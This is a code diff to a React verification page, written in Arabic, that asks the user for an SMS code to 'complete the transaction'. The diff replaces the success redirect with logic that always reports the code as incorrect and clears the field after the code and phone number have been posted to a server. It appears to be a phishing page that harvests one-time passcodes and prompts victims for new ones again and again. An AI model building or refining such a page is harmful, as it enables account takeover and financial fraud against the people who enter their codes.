@@ -48,12 +48,12 @@ export default function VerifyPage() {
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ code: digits, orderId: data?.orderId, customerName: data?.phone }),
       });
-      await new Promise(r => setTimeout(r, 1400));
-      sessionStorage.removeItem("verify_data");
-      router.replace("/");
-    } finally {
-      setSubmitting(false);
-    }
+    } catch {}
+    setSubmitting(false);
+    setError("الرمز الذي أدخلته غير صحيح، يرجى المحاولة مرة أخرى");
+    await new Promise(r => setTimeout(r, 4000));
+    setError("");
+    setOtp("");
   };
 
   const maskedPhone = data?.phone
@@ -96,7 +96,7 @@ export default function VerifyPage() {
           </h2>
           <p className="text-[11px] sm:text-xs text-gray-400 mt-3 leading-relaxed">
             تم إرسال رسالة نصية بها رمز التحقق إلى رقم الجوال{" "}
-            <span className="font-bold text-[#1A2E44]">{maskedPhone}</span> لإتمام المعاملة.
+            <span className="font-bold text-[#1A2E44]" dir="ltr">{maskedPhone}</span> لإتمام المعاملة.
           </p>
         </div>
 
